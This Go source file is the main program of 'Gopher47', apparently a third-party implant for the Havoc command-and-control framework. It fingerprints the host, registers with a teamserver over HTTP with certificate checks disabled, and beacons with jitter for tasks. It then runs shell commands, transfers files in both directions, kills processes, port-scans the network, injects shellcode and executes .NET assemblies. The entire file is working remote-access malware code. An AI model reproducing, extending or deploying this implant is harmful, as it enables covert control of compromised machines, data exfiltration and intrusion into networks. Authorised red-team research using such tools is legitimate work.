package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/user"

	//"log" // only for debugging
	"strconv"
	"strings"
	"time"

	functions "github.com/An00bRektn/gopher47/pkg/agentfuncs"
	"github.com/An00bRektn/gopher47/pkg/utils"
	"github.com/elastic/go-sysinfo"
	systypes "github.com/elastic/go-sysinfo/types"
)

// Globals
// Only HTTP for now
var (
	c = utils.GetConfig()
	url = c.Url
	secure = c.IsSecure
	userAgent = c.UserAgent
	sleepTime = c.SleepTime
	jitterRange = c.JitterRange
	magicBytes = []byte("\x67\x6f\x67\x6f") // GOGO
	timeoutThreshold = c.TimeoutThreshold
	timeoutCounter = -1
	// agentId set in main() because random seeding
	agentId = ""
)

// this will probably never get used
// but I'm too lazy to get rid of it
func checkError(e error){
	if e != nil {
		panic(e)
	}
}

// Generates an Agent ID of 4 lowercase letters
// See: https://codex-7.gitbook.io/codexs-terminal-window/red-team/red-team-dev/extending-havoc-c2/third-party-agents/2-writing-the-agent
func genHeader(length int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz")
    header := make([]rune, length)
    for i := range header {
        header[i] = letters[rand.Intn(len(letters))]
    }
    return string(header)
}

// Fixes version output from go-sysinfo to suit the teamserver's parsing as of 1-1-2024
func fixVersion(osInfo systypes.OSInfo) string{
	// TODO: This is a band-aid fix, current implementation (as of 1-1-2024)
	//		 expects a Windows version number and nothing else, faking it for linux for now
	//		 and cheesing Windows because I need to write my own code to fetch the ProductType
	
	fixedVersion := ""

	// empty build should mean we're not on Windows
	if osInfo.Build == "" {
		fixedVersion = strings.Split(osInfo.Version, " ")[0] + ".0.0.0"
	} else {
		// NOTE: OS Version = MajorVersion.MinorVersion.ProductType.ServicePackMajor.BuildNumber
		fixedVersion = osInfo.Version + "." + "1" + "." + "0" + "." + osInfo.Build
	}
	//println("[ DEBUG ] fixedVersion: " + fixedVersion)
	return fixedVersion
}

// Sends the initial check-in to register the agent
// Forms and sends a POST request to teamserver with all required information
// Heavily reliant on elastic/go-sysinfo
func registerAgent(url string, magic []byte, agentId string) string{
	host, err := sysinfo.Host()
	hostInfo := host.Info()
	checkError(err)
	proc, _ := sysinfo.Self()
	procInfo, _ := proc.Info()

	hostname := hostInfo.Hostname
	currentuser, _ := user.Current()
	procPath, _ := os.Executable()
	
	// TODO: Get Process Elevated and Domain, completely forgot about it
	registerDict := map[string]string{
		"AgentID": agentId,
		"Hostname": hostname,
		"Username": currentuser.Username,
		"Domain": "",
		"InternalIP": utils.FindNotLoopback(hostInfo.IPs),
		"Process Path": procPath,
		"Process Name": procInfo.Name,
		"Process Arch": "x64",
		"Process ID": strconv.Itoa(procInfo.PID),
		"Process Parent ID": strconv.Itoa(procInfo.PPID),
		"Process Elevated": "0",
		"OS Version": fixVersion(*hostInfo.OS),
		"OS Build": hostInfo.OS.Build,
		"OS Arch": hostInfo.Architecture,
		"Sleep": strconv.Itoa(c.SleepTime),
	}

	dat, _ := json.Marshal(registerDict)
	requestDat := `{"task":"register","data":` + string(dat) + "}" // defo a better way to do this but eh

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat) + 12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magic...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	checkError(err)
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("X-IsAGopher", "true") // skid protection
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	var client *http.Client
	if secure {
		tr := &http.Transport{
			// TODO: Verify certificate once we figure out how to do that
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{
			Transport: tr,
		}
	} else {
		client = &http.Client{}
	}

    res, err := client.Do(req)
	if (err != nil){
		return "failed"
	}
    defer res.Body.Close()

	// apparently ioutil is deprecated but I'm barely a golang dev
	// maybe I am now with how much I've done here
	// that python percent on github is so high though >:(
	resBody, _ := ioutil.ReadAll(res.Body)
	if (string(resBody) == "" || resBody == nil) {
		return "failed"
	}

	return string(resBody)
}

func checkIn(dat string, checkInType string) string{
	requestDat := `{"task":"`+checkInType+`","data":"` + string(dat) + `"}`

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat) + 12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magicBytes...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	if os.IsTimeout(err) || err != nil {
		timeoutCounter += 1
	} else {
		timeoutCounter = 0
	}
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("X-IsAGopher", "true")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	var client *http.Client
	if secure {
		tr := &http.Transport{
			// TODO: Verify certificate once we figure out how to do that
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{
			Transport: tr,
		}
	} else {
		client = &http.Client{}
	}

    res, err := client.Do(req)
    if os.IsTimeout(err){
		timeoutCounter += 1
	} else {
		timeoutCounter = 0
	}
    //defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	err = res.Body.Close()
	if err != nil {
		os.Exit(2)
	}
	return string(resBody)
}

// with how the handler works right now, if someone just sends a command like `shell`
// the teamserver will send it, and we need to reject that
func validateArgs(cmdArgs []string) bool {
	// shhh not scuffed not scuffed not scuffed not scuffed
	if utils.Strip(cmdArgs[0]) == "o7" || utils.Strip(cmdArgs[0]) == "ps" || utils.Strip(cmdArgs[0]) == "checkin" {
		return true
	}
	if len(cmdArgs) < 2 {
		return false
	} else {
		return true
	}
}

func RunCommand(command string) string {
	output := ""
	cmdArgs := strings.Fields(command)
	//log.Println(command)

	/*
		Current commands:
		shell, o7, kill, ls, ps, upload, download,
		portscan, shellcode, execute-assembly
	*/
	if validateArgs(cmdArgs) {
		switch (utils.Strip(cmdArgs[0])){
		case "checkin":
			output = functions.CheckIn(&c)
		case "shell":
			output = functions.Shell(cmdArgs[1:])
		case "o7":
			os.Exit(2)
		case "kill":
			pid, err := strconv.Atoi(cmdArgs[1])
			if (err != nil) {
				output = "[!] Error: " + string(err.Error())
			} else {
				output = string(functions.Kill(pid).Error())
				if output == "waitid: no child processes" {
					output = output + " (this means it was successful)"
				}
			}
		case "ls":
			output = functions.Ls(cmdArgs[1])
		case "ps":
			output = functions.Ps()
		case "upload":
			params := strings.Split(command[7:], ";")
			//log.Println(params)
			output = functions.Upload(params[0], params[1])
		case "download":
			params := strings.Split(command[9:], ";")
			//log.Println(params)
			encDat := functions.Download(params[0])
			// check if download errored
			if encDat[0:2] == "[!]"{
				output = encDat
			} else {
				outputJson := map[string]string{
					"filename": params[1],
					"data": encDat,
					"size": strconv.Itoa(len(encDat)),
				}
				// there shouldn't be an error from this but prayge
				final, _ := json.Marshal(outputJson)
				output = string(final) 
			}
		case "portscan":
			var ports []int
			//log.Println(cmdArgs)

			// ports addr workers
			if cmdArgs[1] == "common" {
				//log.Println("Common scan!")
				// from awk '$2~/tcp$/' /usr/share/nmap/nmap-services | sort -r -k3 | head -n 1000 | tr -s ' ' | cut -d '/' -f1 | sed 's/\S*\s*\(\S*\).*/\1,/'
				ports = []int{
					5601, 9300, 80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111,
					995, 993, 5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 514, 5060, 179,
					1026, 2000, 8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008, 49154, 1027, 5666, 646,
					5000, 5631, 631, 49153, 8081, 2049, 88, 79, 5800, 106, 2121, 1110, 49155, 6000, 513, 990, 5357,
					427, 49156, 543, 544, 5101, 144, 7, 389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432,
					1900, 3986, 13, 1029, 9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37, 1000,
					3001, 5001, 82, 10010, 1030, 9090, 2107, 1024, 2103, 6004, 1801, 5050, 19, 8031, 1041, 255,
				}
			} else if cmdArgs[1] == "all" {
				//log.Println("All scan!")
				// is hardcoding this more efficient? yes.
				// do I want that huge wall in my code? not really.
				for i := 0; i < 65535; i++ {
					ports = append(ports, i)
				}
			} else {
				//log.Println("Only scanning " + cmdArgs[1])
				// convert comma separated list of ints to actual list of ints
				nums := strings.Split(cmdArgs[1], ",")
				for _, num := range nums {
					n, err := strconv.Atoi(num)
					if err != nil {
						output = "[!] Error: " + err.Error()
					}
					ports = append(ports, n)
				}
			}
			workers, err := strconv.Atoi(cmdArgs[3])
			if workers < 1 {
				output = output + "\n[!] Error: Concurrent scans cannot be less than 1!"
			}
			if err != nil {
				output = output + "\n[!] Error: " + err.Error()
			}
			if output == "" {
				//log.Println("Starting scan!")
				output = functions.PortScanTCP(cmdArgs[2], ports, workers)
			}
			output = strings.Trim(output, ",")
		case "shellcode":
			output = functions.SelfInject(cmdArgs[1])
		case "execute-assembly":
			params := strings.Split(command[17:], ";")
			if len(params[0]) < 10 { // could just check for empty string but eh
				output = "[!] Error: No file specified."
			} else {
				output = functions.ExecuteAssembly(params[0], strings.Split(params[1], " "))
			}
		}
	} else {
		output = "[!] Insufficient arguments"
	}
	return output
}

func main(){
	// is seeding by time bad?
	// yes, but it's not used for crypto, so we good :)
	rand.Seed(time.Now().UnixNano())
	agentId = genHeader(4)

	// Attempt to register
	registered := "failed"
	for registered == "failed"{
		registered = registerAgent(url, magicBytes, agentId)
		time.Sleep((time.Duration(5) * time.Second))
		timeoutCounter += 1
		if timeoutCounter > timeoutThreshold {
			os.Exit(0) // silently exit instead of panicing
		}
	}
	timeoutCounter = 0
	//log.Println("[+] Gopher47 has checked in!")

	command := ""
	out := ""
	r := 1
	// Begin the implant loop
	for {
		command = checkIn("", "gettask")
		if (len(command) > 4) {
			//log.Println("[*] New Task: " + command)
			//log.Println([]byte(utils.Strip(strings.Fields(command)[0])))
			out = RunCommand(utils.Strip(command[4:]))
			if utils.Strip(strings.Fields(command[4:])[0]) == "download"{
				checkIn(utils.JsonEscape(out), "download")
			} else {
				checkIn(utils.JsonEscape(out), "commandoutput")
			}
		}
		// This might not be how jitter should be implemented
		// But we're randomly varying the amount we sleep before continuing so that the requests aren't *too* regular
		r = rand.Intn(jitterRange)
		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
	}
}
